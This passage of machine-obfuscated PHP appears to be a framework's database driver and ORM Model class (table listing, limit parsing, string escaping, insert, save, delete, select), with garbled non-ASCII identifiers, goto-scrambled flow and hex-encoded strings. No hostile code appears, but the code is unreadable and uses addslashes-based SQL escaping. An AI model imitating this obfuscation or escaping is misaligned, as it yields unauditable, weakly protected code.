èÉ, $fÍ€∑èÚªØ[29] => $a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[29]], $fÍ€∑èÚªØ[31] => (bool) (isset($a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[99]]) && $a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[99]] === $fÍ€∑èÚªØ[33] || isset($a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[31]]) && $a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[31]] === $fÍ€∑èÚªØ[33]), $fÍ€∑èÚªØ[34] => isset($a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[34]]) ? $a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[34]] : (isset($a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[53]]) ? $a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[53]] : $fÍ€∑èÚªØ[357]), $fÍ€∑èÚªØ[36] => isset($a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[89]]) ? strtolower($a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[89]]) == $fÍ€∑èÚªØ[38] : (isset($a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[54]]) ? $a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[54]] : !1), $fÍ€∑èÚªØ[39] => isset($a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[865]]) ? strtolower($a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[865]]) == $fÍ€∑èÚªØ[41] : (isset($a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[89]]) ? $a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[89]] : !1)); } } goto dôé¥äﬂÇã; FÀŸ÷£¥ÇŒ: } public function getTables($aΩ•íô¡çç = '') { $eçÂ¬âπõı =& $_SERVER[¯èãÄπµ]; if (think_config($eçÂ¬âπõı[866])) { $C¶Üàˆöéä = str_replace($eçÂ¬âπõı[867], $aΩ•íô¡çç, think_config($eçÂ¬âπõı[866])); } else { switch ($this->dbType) { case $eçÂ¬âπõı[834]: case $eçÂ¬âπõı[836]: $C¶Üàˆöéä = $eçÂ¬âπõı[868]; break; case $eçÂ¬âπõı[833]: case $eçÂ¬âπõı[851]: $C¶Üàˆöéä = $eçÂ¬âπõı[869]; break; case $eçÂ¬âπõı[860]: $C¶Üàˆöéä = $eçÂ¬âπõı[870]; break; case $eçÂ¬âπõı[835]: think_exception(think_lang($eçÂ¬âπõı[871]) . $eçÂ¬âπõı[872]); break; case $eçÂ¬âπõı[852]: $C¶Üàˆöéä = $eçÂ¬âπõı[42] . $eçÂ¬âπõı[43] . $eçÂ¬âπõı[44]; break; case $eçÂ¬âπõı[863]: default: if (!empty($aΩ•íô¡çç)) { $C¶Üàˆöéä = $eçÂ¬âπõı[816] . $aΩ•íô¡çç; } else { $C¶Üàˆöéä = $eçÂ¬âπõı[817]; } } } $DÇ∫êï ≠¯ = $this->query($C¶Üàˆöéä); $bäÓîÕêéÈ = array(); foreach ($DÇ∫êï ≠¯ as $DÀ‚ø—èÁ¯ => $bﬂù‹’ÌÿÎ) { $bäÓîÕêéÈ[$DÀ‚ø—èÁ¯] = current($bﬂù‹’ÌÿÎ); } return $bäÓîÕêéÈ; } protected function parseLimit($c–£ÇØ≥Â¯) { $fˆî«∫Öã… =& $_SERVER[¯èãÄπµ]; $AÉæ¿ª«åı = $fˆî«∫Öã…[33]; if (!empty($c–£ÇØ≥Â¯)) { switch ($this->dbType) { case $fˆî«∫Öã…[860]: case $fˆî«∫Öã…[852]: $c–£ÇØ≥Â¯ = explode($fˆî«∫Öã…[47], $c–£ÇØ≥Â¯); if (count($c–£ÇØ≥Â¯) > 1) { $AÉæ¿ª«åı .= $fˆî«∫Öã…[48] . $c–£ÇØ≥Â¯[1] . $fˆî«∫Öã…[49] . $c–£ÇØ≥Â¯[0] . $fˆî«∫Öã…[50]; } else { $AÉæ¿ª«åı .= $fˆî«∫Öã…[48] . $c–£ÇØ≥Â¯[0] . $fˆî«∫Öã…[50]; } break; case $fˆî«∫Öã…[833]: case $fˆî«∫Öã…[851]: break; case $fˆî«∫Öã…[835]: break; case $fˆî«∫Öã…[834]: case $fˆî«∫Öã…[836]: break; case $fˆî«∫Öã…[863]: default: $AÉæ¿ª«åı .= $fˆî«∫Öã…[48] . $c–£ÇØ≥Â¯ . $fˆî«∫Öã…[50]; } } return $AÉæ¿ª«åı; } public function parseKey(&$f¨∂…’æÌØ, $A≈ü¡«Ñîó = true) { $a‚«£ùª† =& $_SERVER[¯èãÄπµ]; if ($A≈ü¡«Ñîó) { $f¨∂…’æÌØ = $this->parseKeyCheck($f¨∂…’æÌØ); } if ($this->dbType == $a‚«£ùª†[863]) { if ($f¨∂…’æÌØ != $a‚«£ùª†[172] && !preg_match($a‚«£ùª†[827], $f¨∂…’æÌØ)) { $f¨∂…’æÌØ = $a‚«£ùª†[828] . trim($f¨∂…’æÌØ, $a‚«£ùª†[828]) . $a‚«£ùª†[828]; } return $f¨∂…’æÌØ; } else { return parent::parseKey($f¨∂…’æÌØ); } } public function close() { $this->_linkID = null; } public function error() { $Cåµ”ƒ…«· =& $_SERVER[¯èãÄπµ]; if ($this->PDOStatement) { $bû¡«Ö€æ† = $this->PDOStatement->errorInfo(); $this->error = $bû¡«Ö€æ†[1] . $Cåµ”ƒ…«·[4] . $bû¡«Ö€æ†[2]; } else { $this->error = $Cåµ”ƒ…«·[33]; } if ($Cåµ”ƒ…«·[33] != $this->queryStr) { $this->error .= LNG($Cåµ”ƒ…«·[45]) . $this->queryStr; } think_trace($this->error, $Cåµ”ƒ…«·[33], $Cåµ”ƒ…«·[46]); return $this->error; } public function escapeString($dÊô°ÖïÍ¶) { $CÇ˘ÔÛê¨£ =& $_SERVER[¯èãÄπµ]; switch ($this->dbType) { case $CÇ˘ÔÛê¨£[860]: case $CÇ˘ÔÛê¨£[833]: case $CÇ˘ÔÛê¨£[851]: case $CÇ˘ÔÛê¨£[863]: return addslashes($dÊô°ÖïÍ¶); case $CÇ˘ÔÛê¨£[835]: case $CÇ˘ÔÛê¨£[852]: case $CÇ˘ÔÛê¨£[834]: case $CÇ˘ÔÛê¨£[836]: return str_ireplace($CÇ˘ÔÛê¨£[55], $CÇ˘ÔÛê¨£[56], $dÊô°ÖïÍ¶); } } protected function parseValue($cä∞Ç∏—Üï) { $BÚÛ¨÷›ä» =& $_SERVER[¯èãÄπµ]; if (is_string($cä∞Ç∏—Üï)) { $cä∞Ç∏—Üï = strpos($cä∞Ç∏—Üï, $BÚÛ¨÷›ä»[4]) === 0 ? $this->escapeString($cä∞Ç∏—Üï) : $BÚÛ¨÷›ä»[873] . $this->escapeString($cä∞Ç∏—Üï) . $BÚÛ¨÷›ä»[873]; } elseif (isset($cä∞Ç∏—Üï[0]) && is_string($cä∞Ç∏—Üï[0]) && strtolower($cä∞Ç∏—Üï[0]) == $BÚÛ¨÷›ä»[281]) { $cä∞Ç∏—Üï = $this->escapeString($cä∞Ç∏—Üï[1]); } elseif (is_array($cä∞Ç∏—Üï)) { $cä∞Ç∏—Üï = array_map(array($this, $BÚÛ¨÷›ä»[874]), $cä∞Ç∏—Üï); } elseif (is_bool($cä∞Ç∏—Üï)) { $cä∞Ç∏—Üï = $cä∞Ç∏—Üï ? $BÚÛ¨÷›ä»[83] : $BÚÛ¨÷›ä»[464]; } elseif (is_null($cä∞Ç∏—Üï)) { $cä∞Ç∏—Üï = $BÚÛ¨÷›ä»[99]; } return $cä∞Ç∏—Üï; } public function getLastInsertId() { $eπå≤∑ØË’ =& $_SERVER[¯èãÄπµ]; switch ($this->dbType) { case $eπå≤∑ØË’[860]: case $eπå≤∑ØË’[852]: case $eπå≤∑ØË’[833]: case $eπå≤∑ØË’[851]: case $eπå≤∑ØË’[835]: case $eπå≤∑ØË’[863]: return $this->_linkID->lastInsertId(); case $eπå≤∑ØË’[834]: case $eπå≤∑ØË’[836]: $a´üàä≥˘› = $this->table; $fõìöä¥¥è = $this->query("\x53\x45\x4c\x45\x43\x54\x20{$a´üàä≥˘›}\x2e\x63\x75\162\162\x76\x61\154\x20\x63\x75\x72\162\166\141\154\40\x46\x52\x4f\115\x20\x64\165\141\154"); return $fõìöä¥¥è ? $fõìöä¥¥è[0][$eπå≤∑ØË’[875]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($fÙ‡õ◊÷Í») { goto cÆ≥ÇÊŒ‚—; déïïò”Ÿ∂: if (!$aÕÖÔ¿Í≥ƒ) { return !1; } if (flock($aÕÖÔ¿Í≥ƒ, LOCK_EX)) { $cﬁ¨Ì•íââ = parent::query($fÙ‡õ◊÷Í»); flock($aÕÖÔ¿Í≥ƒ, LOCK_UN); fclose($aÕÖÔ¿Í≥ƒ); return $cﬁ¨Ì•íââ; } flock($aÕÖÔ¿Í≥ƒ, LOCK_UN); goto d‰è¥»ÏöÆ; d‰è¥»ÏöÆ: fclose($aÕÖÔ¿Í≥ƒ); show_json($c⁄÷§Ü∂§Æ[878], !1); return !1; goto B‚¡±Áﬁå; cÆ≥ÇÊŒ‚—: $c⁄÷§Ü∂§Æ =& $_SERVER[¯èãÄπµ]; $cÿ»¯Úœÿ§ = DATA_PATH . $c⁄÷§Ü∂§Æ[876]; $aÕÖÔ¿Í≥ƒ = fopen($cÿ»¯Úœÿ§, $c⁄÷§Ü∂§Æ[877]); goto déïïò”Ÿ∂; B‚¡±Áﬁå: } public function execute($a∂±ﬁ›Ñ´ë) { goto c¨÷À‘ß„Ï; a§Œúé∆¥ü: if (!$C˘’é‹Ã“’) { return !1; } if (flock($C˘’é‹Ã“’, LOCK_EX)) { $CÖ£‰Œ ‰∫ = parent::execute($a∂±ﬁ›Ñ´ë); flock($C˘’é‹Ã“’, LOCK_UN); fclose($C˘’é‹Ã“’); return $CÖ£‰Œ ‰∫; } flock($C˘’é‹Ã“’, LOCK_UN); goto aÖøûÃè´„; aÖøûÃè´„: fclose($C˘’é‹Ã“’); show_json($fåàÑ÷≥’º[878], !1); return !1; goto aÛÈΩÕ“Çî; c¨÷À‘ß„Ï: $fåàÑ÷≥’º =& $_SERVER[¯èãÄπµ]; $EâáŸ†ıí´ = DATA_PATH . $fåàÑ÷≥’º[876]; $C˘’é‹Ã“’ = fopen($EâáŸ†ıí´, $fåàÑ÷≥’º[877]); goto a§Œúé∆¥ü; aÛÈΩÕ“Çî: } } goto cÊ¡Ü∆ç¨Ì; F¡À«ÌäΩâ: define($_SERVER[¯èãÄπµ][226], 0); define($_SERVER[¯èãÄπµ][227], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\145", "\157\162\144\145\x72", "\x61\154\151\x61\x73", "\x68\141\166\151\156\x67", "\147\x72\x6f\x75\x70", "\154\x6f\143\x6b", "\144\151\163\164\151\x6e\x63\x74", "\x61\x75\x74\x6f", "\146\151\154\164\x65\x72", "\x76\141\x6c\x69\x64\141\x74\x65", "\162\x65\x73\x75\154\x74", "\x62\151\x6e\144", "\164\x6f\x6b\x65\156"); public function __construct($c‰ªƒÑ°öü = '', $BŒê˜ëˆﬁÖ = '', $F≈¬™ûå≥ = '') { $CºÁ“ìÇªƒ =& $_SERVER[¯èãÄπµ]; $this->_initialize(); if (!empty($c‰ªƒÑ°öü)) { if (strpos($c‰ªƒÑ°öü, $CºÁ“ìÇªƒ[91])) { list($this->dbName, $this->name) = explode($CºÁ“ìÇªƒ[91], $c‰ªƒÑ°öü); } else { $this->name = $c‰ªƒÑ°öü; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($BŒê˜ëˆﬁÖ)) { $this->tablePrefix = $CºÁ“ìÇªƒ[33]; } elseif ($CºÁ“ìÇªƒ[33] != $BŒê˜ëˆﬁÖ) { $this->tablePrefix = $BŒê˜ëˆﬁÖ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($CºÁ“ìÇªƒ[228]); } $this->db(0, empty($this->connection) ? $F≈¬™ûå≥ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $cœî…åáÖ≈ =& $_SERVER[¯èãÄπµ]; if (empty($this->fields)) { if (think_config($cœî…åáÖ≈[229])) { $Câ—–∏ãñÔ = $this->dbName ? $this->dbName : think_config($cœî…åáÖ≈[230]); $A∞À™±ÍéÖ = think_var_cache($cœî…åáÖ≈[231] . strtolower(get_path_this($Câ—–∏ãñÔ) . $cœî…åáÖ≈[91] . $this->name)); if ($A∞À™±ÍéÖ) { $d…ÕÚ…ïÓ™ = think_config($cœî…åáÖ≈[232]); if (empty($d…ÕÚ…ïÓ™) || $A∞À™±ÍéÖ[$cœî…åáÖ≈[233]] == $d…ÕÚ…ïÓ™) { $this->fields = $A∞À™±ÍéÖ; return; } } } $this->flush(); } } public function flush() { goto b—÷ãÑÆı©; b—÷ãÑÆı©: $aôÀÜﬂ“É… =& $_SERVER[¯èãÄπµ]; $this->db->setModel($this->name); $d¬ê˜≠ç‰¬ = $this->db->getFields($this->getTableName()); goto e≠ﬁµ¥π‚†; D¿ÒŸﬂπœ†: foreach ($d¬ê˜≠ç‰¬ as $Fòˆ£ı´ª¬ => $cëªöùÌóº) { $b√¥≈ê˜á [$Fòˆ£ı´ª¬] = $cëªöùÌóº[$aôÀÜﬂ“É…[29]]; if ($cëªöùÌóº[$aôÀÜﬂ“É…[36]]) { $this->fields[$aôÀÜﬂ“É…[235]] = $Fòˆ£ı´ª¬; if ($cëªöùÌóº[$aôÀÜﬂ“É…[39]]) { $this->fields[$aôÀÜﬂ“É…[234]] = !0; } } } $this->fields[$aôÀÜﬂ“É…[236]] = $b√¥≈ê˜á ; if (think_config($aôÀÜﬂ“É…[232])) { $this->fields[$aôÀÜﬂ“É…[233]] = think_config($aôÀÜﬂ“É…[232]); } goto A´‚ê‚Ë¥ó; e≠ﬁµ¥π‚†: if (!$d¬ê˜≠ç‰¬) { return !1; } $this->fields = array_keys($d¬ê˜≠ç‰¬); $this->fields[$aôÀÜﬂ“É…[234]] = !1; goto D¿ÒŸﬂπœ†; A´‚ê‚Ë¥ó: if (think_config($aôÀÜﬂ“É…[229])) { $fÌı «•∫“ = $this->dbName ? $this->dbName : think_config($aôÀÜﬂ“É…[230]); think_var_cache($aôÀÜﬂ“É…[231] . strtolower(get_path_this($fÌı «•∫“) . $aôÀÜﬂ“É…[91] . $this->name), $this->fields); } goto Dë—Æ…¬…¬; Dë—Æ…¬…¬: } public function switchModel($bÆûıßÈí¨, $c≈ìåò®⁄ç = array()) { $cªêçø⁄≠◊ =& $_SERVER[¯èãÄπµ]; $e«âº◊ £  = ucwords(strtolower($bÆûıßÈí¨)) . $cªêçø⁄≠◊[237]; if (!class_exists($e«âº◊ £ )) { think_exception($e«âº◊ £  . think_lang($cªêçø⁄≠◊[238])); } $this->_extModel = new $e«âº◊ £ ($this->name); if (!empty($c≈ìåò®⁄ç)) { foreach ($c≈ìåò®⁄ç as $d¡Œ≥åÖµ≤) { $this->_extModel->setProperty($d¡Œ≥åÖµ≤, $this->{$d¡Œ≥åÖµ≤}); } } return $this->_extModel; } public function __set($E‘ÿ≠à¡Ó∑, $Fªàæã§˜í) { $this->data[$E‘ÿ≠à¡Ó∑] = $Fªàæã§˜í; } public function __get($E√ÈƒöåÆß) { return isset($this->data[$E√ÈƒöåÆß]) ? $this->data[$E√ÈƒöåÆß] : null; } public function __isset($b∆Ò¬ﬂ“‰«) { return isset($this->data[$b∆Ò¬ﬂ“‰«]); } public function __unset($eâ¨£Ú√ıá) { unset($this->data[$eâ¨£Ú√ıá]); } public function __call($C‹È·Áÿ¡à, $Fäãæú•Ìâ) { $fÂÉê¬ëı§ =& $_SERVER[¯èãÄπµ]; if (in_array(strtolower($C‹È·Áÿ¡à), $this->methods, !0)) { $this->options[strtolower($C‹È·Áÿ¡à)] = $Fäãæú•Ìâ[0]; return $this; } elseif (in_array(strtolower($C‹È·Áÿ¡à), array($fÂÉê¬ëı§[239], $fÂÉê¬ëı§[240], $fÂÉê¬ëı§[241], $fÂÉê¬ëı§[242], $fÂÉê¬ëı§[243]), !0)) { $Eﬂ€ò≥∆€Ø = isset($Fäãæú•Ìâ[0]) ? $Fäãæú•Ìâ[0] : $fÂÉê¬ëı§[172]; $Eﬂ€ò≥∆€Ø = $this->db->parseKey($Eﬂ€ò≥∆€Ø); return $this->getField(strtoupper($C‹È·Áÿ¡à) . $fÂÉê¬ëı§[244] . $Eﬂ€ò≥∆€Ø . $fÂÉê¬ëı§[245] . $C‹È·Áÿ¡à, $fÂÉê¬ëı§[239]); } elseif (strtolower(substr($C‹È·Áÿ¡à, 0, 5)) == $fÂÉê¬ëı§[246]) { $Eﬂ€ò≥∆€Ø = think_parse_name(substr($C‹È·Áÿ¡à, 5)); $bÓÜ„ï€Û‹[$Eﬂ€ò≥∆€Ø] = $Fäãæú•Ìâ[0]; return $this->where($bÓÜ„ï€Û‹)->find(); } elseif (strtolower(substr($C‹È·Áÿ¡à, 0, 10)) == $fÂÉê¬ëı§[247]) { $fø€√∂‡ﬂ· = think_parse_name(substr($C‹È·Áÿ¡à, 10)); $bÓÜ„ï€Û‹[$fø€√∂‡ﬂ·] = $Fäãæú•Ìâ[0]; return $this->where($bÓÜ„ï€Û‹)->getField($Fäãæú•Ìâ[1]); } elseif (isset($this->_scope[$C‹È·Áÿ¡à])) { return $this->scope($C‹È·Áÿ¡à, $Fäãæú•Ìâ[0]); } elseif (method_exists($this, $C‹È·Áÿ¡à)) { array_unshift($Fäãæú•Ìâ, $C‹È·Áÿ¡à); return call_user_func_array(array($this, $fÂÉê¬ëı§[248]), $Fäãæú•Ìâ); } else { return call_user_func_array(array(parent, $C‹È·Áÿ¡à), $Fäãæú•Ìâ); } } protected function call() { goto E∑Ë±ìÙ ´; D¯√Í§„≈∞: $a∆Û¢äÇ…∑ = $e÷êèÃãƒæ; if (is_array($e÷êèÃãƒæ)) { $a∆Û¢äÇ…∑ = $e÷êèÃãƒæ[1]; $e÷êèÃãƒæ = $e÷êèÃãƒæ[0]; } $D˜ê”Êç≈ú = count($F∆âÚŒÈÓã) - 1; goto fµí‡¨öº≈; E∑Ë±ìÙ ´: $F€Û°ªÆ›¶ =& $_SERVER[¯èãÄπµ]; $F∆âÚŒÈÓã = func_get_args(); $e÷êèÃãƒæ = array_shift($F∆âÚŒÈÓã); goto D¯√Í§„≈∞; fµí‡¨öº≈: if (isset($F∆âÚŒÈÓã[$D˜ê”Êç≈ú]) && $F∆âÚŒÈÓã[$D˜ê”Êç≈ú] === $e÷êèÃãƒæ) { think_exception(__CLASS__ . $F€Û°ªÆ›¶[4] . $e÷êèÃãƒæ . think_lang($F€Û°ªÆ›¶[249])); return; } $F∆âÚŒÈÓã[] = $e÷êèÃãƒæ; if (method_exists($this, $F€Û°ªÆ›¶[250])) { $C®ÁÜ«¿èÌ = call_user_func_array(array($this, $F€Û°ªÆ›¶[251]), array($a∆Û¢äÇ…∑, $F∆âÚŒÈÓã)); if (!is_null($C®ÁÜ«¿èÌ) && $C®ÁÜ«¿èÌ !== !1) { return $C®ÁÜ«¿èÌ; } } goto eùÉÌıã÷Ñ; eùÉÌıã÷Ñ: $FﬂêÌŸƒÓê = call_user_func_array(array($this, $e÷êèÃãƒæ), $F∆âÚŒÈÓã); if (method_exists($this, $F€Û°ªÆ›¶[252])) { $C®ÁÜ«¿èÌ = call_user_func_array(array($this, $F€Û°ªÆ›¶[253]), array($a∆Û¢äÇ…∑, $F∆âÚŒÈÓã, $FﬂêÌŸƒÓê)); if ($C®ÁÜ«¿èÌ) { return $C®ÁÜ«¿èÌ; } } return $FﬂêÌŸƒÓê; goto DË¶ÿÏ«‘ï; DË¶ÿÏ«‘ï: } protected function _initialize() { } protected function _facade($EÂﬂˆ†–¯–) { $dè∆øá¡æÇ =& $_SERVER[¯èãÄπµ]; if (!empty($this->fields)) { foreach ($EÂﬂˆ†–¯– as $d¿Ó∆¿≤˜ => $aìå—∑ÛÇÇ) { if (!in_array($d¿Ó∆¿≤˜, $this->fields, !0)) { unset($EÂﬂˆ†–¯–[$d¿Ó∆¿≤˜]); } elseif (is_scalar($aìå—∑ÛÇÇ)) { $this->_parseType($EÂﬂˆ†–¯–, $d¿Ó∆¿≤˜); } } } if (!empty($this->options[$dè∆øá¡æÇ[254]])) { $EÂﬂˆ†–¯– = array_map($this->options[$dè∆øá¡æÇ[254]], $EÂﬂˆ†–¯–); unset($this->options[$dè∆øá¡æÇ[254]]); } $this->_beforeWrite($EÂﬂˆ†–¯–); return $EÂﬂˆ†–¯–; } protected function _beforeWrite(&$fÉ«è¯ŒÛã) { } public function add($c≥Ñ¢¢ÓÃñ = '', $eåéÉ§Ô‹ = array(), $Eﬁ—£¡ôÛÇ = false) { goto dûÖ“ãßÒÙ; E÷Æ¶∑†≠‡: return $FªÈıå¨àµ; goto fë˜ë∞¬Òè; dûÖ“ãßÒÙ: if (empty($c≥Ñ¢¢ÓÃñ)) { if (!empty($this->data)) { $c≥Ñ¢¢ÓÃñ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¯èãÄπµ][255]); return !1; } } $eåéÉ§Ô‹ = $this->_parseOptions($eåéÉ§Ô‹); $c≥Ñ¢¢ÓÃñ = $this->_facade($c≥Ñ¢¢ÓÃñ); goto E»´ı∫“Ûè; E»´ı∫“Ûè: if (!1 === $this->_beforeInsert($c≥Ñ¢¢ÓÃñ, $eåéÉ§Ô‹)) { return !1; } $FªÈıå¨àµ = $this->db->insert($c≥Ñ¢¢ÓÃñ, $eåéÉ§Ô‹, $Eﬁ—£¡ôÛÇ); if (!1 !== $FªÈıå¨àµ) { $BÔÑ‡ÙÜ∆‚ = $this->getLastInsID(); if ($BÔÑ‡ÙÜ∆‚) { $c≥Ñ¢¢ÓÃñ[$this->getPk()] = $BÔÑ‡ÙÜ∆‚; $this->_after_insert($c≥Ñ¢¢ÓÃñ, $eåéÉ§Ô‹); return $BÔÑ‡ÙÜ∆‚; } $this->_after_insert($c≥Ñ¢¢ÓÃñ, $eåéÉ§Ô‹); } goto E÷Æ¶∑†≠‡; fë˜ë∞¬Òè: } protected function _beforeInsert(&$C®É˘‰Ï˜≈, $cÖ≈›âåÈí) { } protected function _after_insert($e÷úÀﬂåÃö, $CñÂºâÜÜ„) { } public function addAll($F–“¿óËêÀ, $EƒÓ´éæ¡ê = array(), $Eã ËÖáÃ« = false) { goto A≥æ≥Óé„¯; c˜§ÿ»⁄Ÿ: return $B¢÷°¶Ñ≈Ì; goto eÑ€Ú’¯Áœ; A≥æ≥Óé„¯: $dıÔãô±∆⁄ =& $_SERVER[¯èãÄπµ]; if (empty($F–“¿óËêÀ)) { $this->error = think_lang($dıÔãô±∆⁄[255]); return !1; } $EƒÓ´éæ¡ê = $this->_parseOptions($EƒÓ´éæ¡ê); goto fÕ‡ä§≠¯≈; fÕ‡ä§≠¯≈: foreach ($F–“¿óËêÀ as $b©â˜†Ö∫Ã => $Bç¡◊òƒúí) { $F–“¿óËêÀ[$b©â˜†Ö∫Ã] = $this->_facade($Bç¡◊òƒúí); } if (method_exists($this->db, $dıÔãô±∆⁄[256])) { $B¢÷°¶Ñ≈Ì = $this->db->insertAll($F–“¿óËêÀ, $EƒÓ´éæ¡ê, $Eã ËÖáÃ«); } else { $this->startTrans(); foreach ($F–“¿óËêÀ as $b©â˜†Ö∫Ã => $Bç¡◊òƒúí) { $B¢÷°¶Ñ≈Ì = $this->db->insert($Bç¡◊òƒúí, $EƒÓ´éæ¡ê, $Eã ËÖáÃ«); } $this->commit(); } if (!1 !== $B¢÷°¶Ñ≈Ì) { $AÜ¢ÿ∏ê• = $this->getLastInsID(); if ($AÜ¢ÿ∏ê•) { return $AÜ¢ÿ∏ê•; } } goto c˜§ÿ»⁄Ÿ; eÑ€Ú’¯Áœ: } public function selectAdd($c»Éé¶ﬂ°Ú = '', $e÷éÙ±≤üÊ = '', $bµ° áﬂñí = array()) { $bÑ…—ƒ·™Ò =& $_SERVER[¯èãÄπµ]; $bµ° áﬂñí = $this->_parseOptions($bµ° áﬂñí); if (!1 === ($cè…‡¯á˜« = $this->db->selectInsert($c»Éé¶ﬂ°Ú ? $c»Éé¶ﬂ°Ú : $bµ° áﬂñí[$bÑ…—ƒ·™Ò[257]], $e÷éÙ±≤üÊ ? $e÷éÙ±≤üÊ : $this->getTableName(), $bµ° áﬂñí))) { $this->error = think_lang($bÑ…—ƒ·™Ò[258]); return !1; } else { return $cè…‡¯á˜«; } } public function save($aÊ†»ßÓ∑Ì = '', $CØˆ≤Êœ£ó = array()) { goto bèà¨Á≈ı‘; aŸ˜Œ∞ÇÉô: if (!1 !== $FàœÑê‹´–) { if (isset($CÁÊêÆßÒ∞)) { $aÊ†»ßÓ∑Ì[$cõ¢ÁˆôÉ¿] = $CÁÊêÆßÒ∞; } $this->_afterUpdate($aÊ†»ßÓ∑Ì, $CØˆ≤Êœ£ó); } return $FàœÑê‹´–; goto EØ©€Î—Œ¥; Bõ¡∫ˆ»™¨: if (is_array($CØˆ≤Êœ£ó[$aÜÜ»Îó±¨[259]]) && isset($CØˆ≤Êœ£ó[$aÜÜ»Îó±¨[259]][$cõ¢ÁˆôÉ¿])) { $CÁÊêÆßÒ∞ = $CØˆ≤Êœ£ó[$aÜÜ»Îó±¨[259]][$cõ¢ÁˆôÉ¿]; } if (!1 === $this->_beforeUpdate($aÊ†»ßÓ∑Ì, $CØˆ≤Êœ£ó)) { return !1; } $FàœÑê‹´– = $this->db->update($aÊ†»ßÓ∑Ì, $CØˆ≤Êœ£ó); goto aŸ˜Œ∞ÇÉô; AñÃ¯›–Ï‚: $CØˆ≤Êœ£ó = $this->_parseOptions($CØˆ≤Êœ£ó); $cõ¢ÁˆôÉ¿ = $this->getPk(); if (!isset($CØˆ≤Êœ£ó[$aÜÜ»Îó±¨[259]])) { if (isset($aÊ†»ßÓ∑Ì[$cõ¢ÁˆôÉ¿])) { $B≤„ÉΩﬁçΩ[$cõ¢ÁˆôÉ¿] = $aÊ†»ßÓ∑Ì[$cõ¢ÁˆôÉ¿]; $CØˆ≤Êœ£ó[$aÜÜ»Îó±¨[259]] = $B≤„ÉΩﬁçΩ; unset($aÊ†»ßÓ∑Ì[$cõ¢ÁˆôÉ¿]); } else { $this->error = think_lang($aÜÜ»Îó±¨[258]); return !1; } } goto Bõ¡∫ˆ»™¨; bèà¨Á≈ı‘: $aÜÜ»Îó±¨ =& $_SERVER[¯èãÄπµ]; if (empty($aÊ†»ßÓ∑Ì)) { if (!empty($this->data)) { $aÊ†»ßÓ∑Ì = $this->data; $this->data = array(); } else { $this->error = think_lang($aÜÜ»Îó±¨[255]); return !1; } } $aÊ†»ßÓ∑Ì = $this->_facade($aÊ†»ßÓ∑Ì); goto AñÃ¯›–Ï‚; EØ©€Î—Œ¥: } protected function _beforeUpdate(&$EØ¿ù©–Ω‡, $aöõ∞ˆãÙ÷) { } protected function _afterUpdate($bö¯äêÙËë, $b®â“îãÜÖ) { } public function delete($E¬’ùÆÑß” = array()) { goto F⁄‘ÓÜÕê¡; F⁄‘ÓÜÕê¡: $EÂî¿Ñˆ»ñ =& $_SERVER[¯èãÄπµ]; if (empty($E¬’ùÆÑß”) && empty($this->options[$EÂî¿Ñˆ»ñ[259]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $dãÑæ®›µÑ = $this->getPk(); goto bœ¯∆•π∆à; bœ¯∆•π∆à: if (is_numeric($E¬’ùÆÑß”) || is_string($E¬’ùÆÑß”)) { if (strpos($E¬’ùÆÑß”, $EÂî¿Ñˆ»ñ[47])) { $aåé„∂ñãú[$dãÑæ®›µÑ] = array($EÂî¿Ñˆ»ñ[260], $E¬’ùÆÑß”); } else { $aåé„∂ñãú[$dãÑæ®›µÑ] = $E¬’ùÆÑß”; } $this->options[$EÂî¿Ñˆ»ñ[259]] = $aåé„∂ñãú; } $E¬’ùÆÑß” = $this->_parseOptions(); if (is_array($E¬’ùÆÑß”[$EÂî¿Ñˆ»ñ[259]]) && isset($E¬’ùÆÑß”[$EÂî¿Ñˆ»ñ[259]][$dãÑæ®›µÑ])) { $aÿ§±€ëãÃ = $E¬’ùÆÑß”[$EÂî¿Ñˆ»ñ[259]][$dãÑæ®›µÑ]; } goto b¢Ñ¥ãÎìŒ; b¢Ñ¥ãÎìŒ: $EõÏΩ«åò˘ = $this->db->delete($E¬’ùÆÑß”); if (!1 !== $EõÏΩ«åò˘) { $a¥¿˘¨‹çè = array(); if (isset($aÿ§±€ëãÃ)) { $a¥¿˘¨‹çè[$dãÑæ®›µÑ] = $aÿ§±€ëãÃ; } $this->_after_delete($a¥¿˘¨‹çè, $E¬’ùÆÑß”); } return $EõÏΩ«åò˘; goto fÏºË§åï„; fÏºË§åï„: } protected function _after_delete($Cõ£û≈¨ò–, $Cúùä’çÏÒ) { } public function select($B≥®¯Ñ¡†ÿ = array()) { goto AƒÏÈ±À≤π; c©Ñ¿£Ñï≥: $A¢∞ã§æä· = $this->db->select($B≥®¯Ñ¡†ÿ); if (!1 === $A¢∞ã§æä·) { return !1; } if (empty($A¢∞ã§æä·)) { return null; } goto Dâ∑ﬂ™µ≈å; Dâ∑ﬂ™µ≈å: $this->_afterSelect($A¢∞ã§æä·, $B≥®¯Ñ¡†ÿ); return $A¢∞ã§æä·; goto eñ◊≤í±ë≈; 